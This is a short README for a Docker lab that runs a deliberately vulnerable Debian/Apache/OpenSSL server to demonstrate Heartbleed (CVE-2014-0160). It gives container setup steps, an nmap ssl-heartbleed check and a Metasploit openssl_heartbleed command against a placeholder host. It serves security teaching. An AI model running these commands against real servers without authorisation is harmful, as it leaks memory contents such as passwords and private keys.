# Heartbleed
### Setup
Debian + Apache2 + OpenSSL (V. 1.0.1) based on https://github.com/effesociety/heartbleed-vulnerable-server <br>
exploit based on: https://github.com/jknudsen-synopsys/heartbleed-box

Requirements:
- Docker
- git
- python

#
### Heartbleed Vulnerable Server
A Debian (Wheezy) Linux system with a vulnerable version of libssl and openssl and a web server to showcase CVS-2014-0160, a.k.a. Heartbleed.

# Overview
This docker container is based on Debian Jessie and has been modified to use a vulnerable version of libssl and openssl.

![Vulnerable Web Page](./docs/vulnerable-web-server.jpg)

Log in to save the input to the server and then have it output by the exploit 

#
### Installation
Install the container with `docker pull effesociety/heartbleed-vulnerable-server`

Run the container with a port mapping `docker run -d -p 8443:443 effesociety/heartbleed-vulnerable-server`

You should be able to access the web application at http://your-ip:8443/.

# Checking
The web server/vulnerable openssl/libssl version can be verified and exploited as shown below (using a Kali machine is recommended):</br>

``` sh
root@kali:~/heartbleed-vulnerable-server# nmap -sV -p 8443 --script=ssl-heartbleed your-ip
```

# Exploitation
``` sh
msfconsole
root@kali:/tmp# msfcli auxiliary/scanner/ssl/openssl_heartbleed RHOSTS=your-ip RPORT=8443 VERBOSE=true E
